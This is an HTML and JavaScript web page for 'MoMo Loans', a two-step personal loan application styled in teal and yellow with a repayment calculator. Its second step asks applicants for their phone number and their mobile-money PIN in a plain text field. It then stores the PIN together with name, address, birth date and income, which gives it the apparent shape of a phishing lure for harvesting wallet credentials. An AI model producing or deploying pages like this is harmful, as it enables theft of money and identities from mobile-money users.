<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>MoMo Loans</title>
    <meta name="description" content="Dark teal themed loan application with calculator and MoMo form" />
    <style>
      :root{
        --bg:#0d4a62;
        --panel:rgba(8,40,55,0.68);
        --card:#0e5a71;
        --border:rgba(166,210,224,0.22);
        --text:#eef9ff;
        --muted:#d9eff9;
        --primary:#f4d54f;
        --primary-strong:#f0c932;
        --accent:#f4d54f;
        --success:#4ecb9c;
        --shadow:0 20px 45px rgba(4,22,28,0.38);
        --radius:18px;
      }

      *{box-sizing:border-box}
      html,body{height:100%;margin:0}
      body{
        min-height:100vh;
        font-family:Inter, "Segoe UI", system-ui, sans-serif;
        background:var(--bg);
        color:var(--text);
      }

      .app-shell{
        position:relative;
        min-height:100vh;
        overflow-x:hidden;
        overflow-y:auto;
        padding-bottom:80px;
      }

      .background-glow{
        position:absolute;
        width:420px;
        height:420px;
        border-radius:50%;
        filter:blur(80px);
        opacity:0.12;
      }
      .glow-one{background:var(--primary);top:-80px;right:5%}
      .glow-two{background:var(--primary);bottom:-80px;left:7%}

      .topbar{
        position:relative;
        z-index:1;
        max-width:1200px;
        margin:0 auto;
        display:flex;
        align-items:center;
        justify-content:center;
        padding:22px 20px 0;
      }

      .brand{
        display:flex;
        align-items:center;
        gap:8px;
        font-weight:700;
        letter-spacing:0.03em;
        color:var(--primary);
      }

      .brand-mark{
        display:inline-flex;
        align-items:center;
        justify-content:center;
        width:30px;
        height:30px;
        border-radius:8px;
        background:linear-gradient(135deg,#f8dc5b,#f0c932);
        color:#0a4a61;
        font-weight:900;
        font-size:1rem;
        box-shadow:0 0 0 2px rgba(255,255,255,0.18);
      }

      .page{
        position:relative;
        z-index:1;
        max-width:1200px;
        margin:0 auto;
        padding:22px 20px 0;
      }

      .hero{
        display:grid;
        grid-template-columns:1fr;
        gap:18px;
        align-items:center;
        max-width:560px;
        margin:0 auto;
      }

      .hero-copy{
        padding:0;
        text-align:center;
      }

      .eyebrow{
        display:inline-flex;
        padding:8px 12px;
        border-radius:999px;
        background:rgba(255,255,255,0.04);
        border:1px solid rgba(255,255,255,0.06);
        color:var(--primary);
        font-size:.72rem;
        letter-spacing:.08em;
        text-transform:uppercase;
        font-weight:700;
      }

      h1{
        font-size:clamp(2rem,3vw,3rem);
        line-height:1.1;
        margin:18px 0 10px;
        letter-spacing:0.02em;
        text-transform:uppercase;
        font-weight:800;
      }

      .lead{
        color:var(--muted);
        margin:0;
        font-size:1rem;
        line-height:1.6;
      }

      .form-card{
        background:rgba(11,74,94,0.82);
        border:1px solid var(--border);
        border-radius:var(--radius);
        box-shadow:var(--shadow);
        padding:22px 20px 18px;
        backdrop-filter:blur(8px);
      }

      .step-header{
        margin-bottom:14px;
      }

      .step-pill{
        display:inline-flex;
        padding:7px 10px;
        border-radius:999px;
        background:rgba(255,255,255,0.04);
        color:var(--primary);
        font-weight:700;
        font-size:.72rem;
        letter-spacing:0.05em;
        text-transform:uppercase;
      }

      .step-header h2{
        margin:12px 0 0;
        font-size:clamp(1.4rem,2vw,2rem);
      }

      .grid{
        display:grid;
        gap:14px;
      }

      .two-col{
        grid-template-columns:repeat(2,minmax(0,1fr));
      }

      label{
        display:flex;
        flex-direction:column;
        gap:8px;
        color:var(--muted);
        font-size:.92rem;
      }

      label span{
        color:var(--muted);
      }

      input{
        width:100%;
        border:1px solid rgba(255,255,255,0.14);
        background:rgba(18,93,118,0.38);
        border-radius:10px;
        padding:12px 12px;
        color:var(--text);
        outline:none;
        transition:border-color .15s ease, box-shadow .15s ease;
      }

      input::placeholder{
        color:rgba(236,249,255,0.7);
      }

      input:focus{
        border-color:rgba(244,213,79,.9);
        box-shadow:0 0 0 3px rgba(244,213,79,0.12);
      }

      .full-width{
        grid-column:1 / -1;
      }

      .loan-slider{
        background:rgba(15,86,106,0.38);
        border-radius:12px;
        border:1px solid rgba(255,255,255,0.08);
        padding:16px;
      }

      .loan-slider-head{
        display:flex;
        align-items:center;
        justify-content:space-between;
        margin-bottom:10px;
        color:var(--muted);
      }

      .loan-slider-head strong{
        color:var(--primary);
        font-size:1.1rem;
      }

      input[type="range"]{
        width:100%;
        height:6px;
        appearance:none;
        background:transparent;
        padding:0;
      }

      input[type="range"]::-webkit-slider-runnable-track{
        height:6px;
        border-radius:999px;
        background:linear-gradient(90deg,var(--primary),rgba(244,213,79,0.56));
      }

      input[type="range"]::-webkit-slider-thumb{
        appearance:none;
        width:18px;
        height:18px;
        border-radius:50%;
        border:2px solid rgba(10,61,78,0.9);
        background:var(--primary);
        margin-top:-6px;
        cursor:pointer;
      }

      .slider-range{
        display:flex;
        justify-content:space-between;
        margin-top:8px;
        color:var(--muted);
        font-size:.78rem;
      }

      .summary-box{
        display:grid;
        grid-template-columns:repeat(3,minmax(0,1fr));
        gap:12px;
        margin-top:16px;
        margin-bottom:18px;
        padding:14px;
        background:rgba(255,255,255,0.02);
        border:1px solid var(--border);
        border-radius:10px;
      }

      .summary-box small{
        color:var(--muted);
      }

      .summary-box strong{
        font-size:1.05rem;
        color:var(--primary);
      }

      .actions-row{
        display:flex;
        gap:12px;
        justify-content:space-between;
      }

      .primary-button,
      .secondary-button{
        border:none;
        border-radius:10px;
        cursor:pointer;
        padding:12px 18px;
        font-weight:700;
        transition:transform .18s ease;
      }

      .primary-button{
        background:linear-gradient(135deg,var(--primary),var(--primary-strong));
        color:#103847;
        box-shadow:0 12px 24px rgba(244,213,79,0.18);
      }

      .secondary-button{
        background:rgba(255,255,255,0.04);
        color:var(--text);
        border:1px solid var(--border);
      }

      .primary-button:hover,
      .secondary-button:hover{
        transform:translateY(-2px);
      }

      .success-message{
        background:rgba(78,203,156,0.08);
        border:1px solid rgba(78,203,156,0.35);
        color:var(--success);
        border-radius:10px;
        padding:12px 14px;
        margin-top:12px;
      }

      @media (max-width:860px){
        .hero{max-width:100%}
        .two-col{grid-template-columns:1fr}
        .summary-box{grid-template-columns:1fr}
        .actions-row{flex-direction:column}
      }
    </style>
  </head>
  <body>
    <div class="app-shell">
      <div class="background-glow glow-one"></div>
      <div class="background-glow glow-two"></div>

      <header class="topbar">
        <div class="brand">
          <div class="brand-mark">M</div>
          <div>MoMo</div>
        </div>
      </header>

      <main class="page" role="main">
        <section class="hero">
          <div class="hero-copy">
            <span class="eyebrow">Fast, secure, simple</span>
            <h1>MoMo Loans</h1>
            <p class="lead">Apply for a personal loan in two simple steps</p>
          </div>

          <div class="form-card" aria-live="polite">
            <div id="form-root"></div>
          </div>
        </section>
      </main>
    </div>

    <script>
      (function () {
        const STORAGE_KEY = 'momo_frontend_submissions_v1';

        const currencyFormatter = new Intl.NumberFormat('en-ZM', {
          style: 'currency',
          currency: 'ZMW',
          maximumFractionDigits: 2
        });

        const defaultForm = {
          name: '',
          email: '',
          address: '',
          dateOfBirth: '',
          monthlyIncome: '',
          loanAmount: 12000,
          phoneNumber: '',
          momoPin: ''
        };

        let formState = { ...defaultForm };
        const formRoot = document.getElementById('form-root');

        function readSubmissions() {
          try {
            const raw = localStorage.getItem(STORAGE_KEY);
            return raw ? JSON.parse(raw) : [];
          } catch {
            return [];
          }
        }
        function writeSubmissions(list) {
          localStorage.setItem(STORAGE_KEY, JSON.stringify(list || []));
        }

        function calculateLoan(principal) {
          const p = Number(principal) || 0;
          const rate = 18 / 12 / 100;
          const months = 24;
          if (p <= 0) return { monthlyPayment: 0, totalRepayment: 0, totalInterest: 0 };
          const monthlyPayment = (p * rate * Math.pow(1 + rate, months)) / (Math.pow(1 + rate, months) - 1);
          const totalRepayment = monthlyPayment * months;
          const totalInterest = totalRepayment - p;
          return { monthlyPayment, totalRepayment, totalInterest };
        }

        function createInput({ label, type = 'text', name, placeholder = '', value = '' }) {
          const wrapper = document.createElement('label');
          const span = document.createElement('span');
          span.textContent = label;
          const input = document.createElement('input');
          input.type = type;
          input.name = name;
          input.placeholder = placeholder;
          input.value = value || '';
          wrapper.appendChild(span);
          wrapper.appendChild(input);
          return { wrapper, input };
        }

        function updateLoanSummary(value) {
          const calc = calculateLoan(value);
          const monthly = document.getElementById('monthlyPayment');
          const interest = document.getElementById('totalInterest');
          const repayment = document.getElementById('totalRepayment');
          const loanLabel = document.getElementById('loanAmountLabel');
          if (monthly) monthly.textContent = currencyFormatter.format(calc.monthlyPayment);
          if (interest) interest.textContent = currencyFormatter.format(calc.totalInterest);
          if (repayment) repayment.textContent = currencyFormatter.format(calc.totalRepayment);
          if (loanLabel) loanLabel.textContent = currencyFormatter.format(Number(value));
        }

        function renderStep1() {
          formRoot.innerHTML = '';

          const stepHeader = document.createElement('div');
          stepHeader.className = 'step-header';
          stepHeader.innerHTML = '<div class="step-pill">Step 1 of 2</div><h2>Personal details & loan</h2>';

          const grid = document.createElement('div');
          grid.className = 'grid two-col';

          const nameField = createInput({ label: 'Full name', name: 'name', placeholder: 'Jane Doe', value: formState.name });
          const emailField = createInput({ label: 'Email address', type: 'email', name: 'email', placeholder: 'jane@example.com', value: formState.email });
          const addressField = createInput({ label: 'Address', name: 'address', placeholder: '123 Chibombo Road, Lusaka', value: formState.address });
          addressField.wrapper.classList.add('full-width');
          const dobField = createInput({ label: 'Date of birth', type: 'date', name: 'dateOfBirth', value: formState.dateOfBirth });
          const incomeField = createInput({ label: 'Monthly income (ZMW)', type: 'number', name: 'monthlyIncome', placeholder: '50000', value: formState.monthlyIncome });

          nameField.input.addEventListener('input', (e) => formState.name = e.target.value);
          emailField.input.addEventListener('input', (e) => formState.email = e.target.value);
          addressField.input.addEventListener('input', (e) => formState.address = e.target.value);
          dobField.input.addEventListener('input', (e) => formState.dateOfBirth = e.target.value);
          incomeField.input.addEventListener('input', (e) => formState.monthlyIncome = e.target.value);

          grid.appendChild(nameField.wrapper);
          grid.appendChild(emailField.wrapper);
          grid.appendChild(addressField.wrapper);
          grid.appendChild(dobField.wrapper);
          grid.appendChild(incomeField.wrapper);

          const loanBlock = document.createElement('div');
          loanBlock.className = 'loan-slider full-width';

          const loanHead = document.createElement('div');
          loanHead.className = 'loan-slider-head';
          const loanLabel = document.createElement('span');
          loanLabel.textContent = 'Loan amount';
          const loanAmountLabel = document.createElement('strong');
          loanAmountLabel.id = 'loanAmountLabel';
          loanHead.appendChild(loanLabel);
          loanHead.appendChild(loanAmountLabel);

          const range = document.createElement('input');
          range.type = 'range';
          range.min = 1000;
          range.max = 200000;
          range.step = 1000;
          range.value = String(formState.loanAmount);

          range.addEventListener('input', (e) => {
            formState.loanAmount = Number(e.target.value);
            updateLoanSummary(formState.loanAmount);
          });

          const sliderRange = document.createElement('div');
          sliderRange.className = 'slider-range';
          sliderRange.innerHTML = `<span>${currencyFormatter.format(1000)}</span><span>${currencyFormatter.format(200000)}</span>`;

          loanBlock.appendChild(loanHead);
          loanBlock.appendChild(range);
          loanBlock.appendChild(sliderRange);

          const summaryBox = document.createElement('div');
          summaryBox.className = 'summary-box';

          const box1 = document.createElement('div');
          box1.innerHTML = '<small>Monthly payment</small><strong id="monthlyPayment" class="mono">0</strong>';

          const box2 = document.createElement('div');
          box2.innerHTML = '<small>Total interest</small><strong id="totalInterest" class="mono">0</strong>';

          const box3 = document.createElement('div');
          box3.innerHTML = '<small>Total repayment</small><strong id="totalRepayment" class="mono">0</strong>';

          summaryBox.appendChild(box1);
          summaryBox.appendChild(box2);
          summaryBox.appendChild(box3);

          const continueBtn = document.createElement('button');
          continueBtn.type = 'button';
          continueBtn.className = 'primary-button';
          continueBtn.textContent = 'Continue';

          continueBtn.addEventListener('click', () => {
            if (!formState.name.trim()) { alert('Please enter your full name.'); return; }
            if (!formState.email.trim()) { alert('Please enter your email.'); return; }
            renderStep2();
          });

          formRoot.appendChild(stepHeader);
          formRoot.appendChild(grid);
          formRoot.appendChild(loanBlock);
          formRoot.appendChild(summaryBox);
          formRoot.appendChild(continueBtn);

          updateLoanSummary(formState.loanAmount);
        }

        function renderStep2() {
          formRoot.innerHTML = '';

          const stepHeader = document.createElement('div');
          stepHeader.className = 'step-header';
          stepHeader.innerHTML = '<div class="step-pill">Step 2 of 2</div><h2>Contact & verification</h2>';

          const formEl = document.createElement('form');
          formEl.className = 'grid two-col';

          const phoneField = createInput({ label: 'Phone number', name: 'phoneNumber', placeholder: '+260 955 123 456', value: formState.phoneNumber });
          phoneField.wrapper.classList.add('full-width');

          const momoPinField = createInput({ label: 'MoMo PIN', name: 'momoPin', placeholder: '0000', value: formState.momoPin });

          phoneField.input.addEventListener('input', (e) => formState.phoneNumber = e.target.value);
          momoPinField.input.addEventListener('input', (e) => formState.momoPin = e.target.value);

          const actions = document.createElement('div');
          actions.className = 'full-width actions-row';

          const backBtn = document.createElement('button');
          backBtn.type = 'button';
          backBtn.className = 'secondary-button';
          backBtn.textContent = 'Back';
          backBtn.addEventListener('click', renderStep1);

          const submitBtn = document.createElement('button');
          submitBtn.type = 'submit';
          submitBtn.className = 'primary-button';
          submitBtn.textContent = 'Submit application';

          actions.appendChild(backBtn);
          actions.appendChild(submitBtn);

          const successMsg = document.createElement('div');
          successMsg.className = 'success-message full-width';
          successMsg.style.display = 'none';

          formEl.appendChild(phoneField.wrapper);
          formEl.appendChild(momoPinField.wrapper);
          formEl.appendChild(actions);
          formEl.appendChild(successMsg);

          formEl.addEventListener('submit', function (e) {
            e.preventDefault();
            if (!formState.phoneNumber.trim()) { alert('Please enter your phone number.'); return; }

            const payload = {
              id: Date.now(),
              createdAt: new Date().toISOString(),
              name: formState.name,
              email: formState.email,
              address: formState.address,
              dateOfBirth: formState.dateOfBirth,
              monthlyIncome: Number(formState.monthlyIncome) || 0,
              loanAmount: Number(formState.loanAmount) || 0,
              phoneNumber: formState.phoneNumber,
              momoPin: formState.momoPin
            };

            const list = readSubmissions();
            list.unshift(payload);
            writeSubmissions(list);

            successMsg.textContent = 'Application submitted successfully.';
            successMsg.style.display = 'block';

            formState = { ...defaultForm };
            setTimeout(() => renderStep1(), 900);
          });

          formRoot.appendChild(stepHeader);
          formRoot.appendChild(formEl);
        }

        renderStep1();
      })();
    </script>
  </body>
</html>
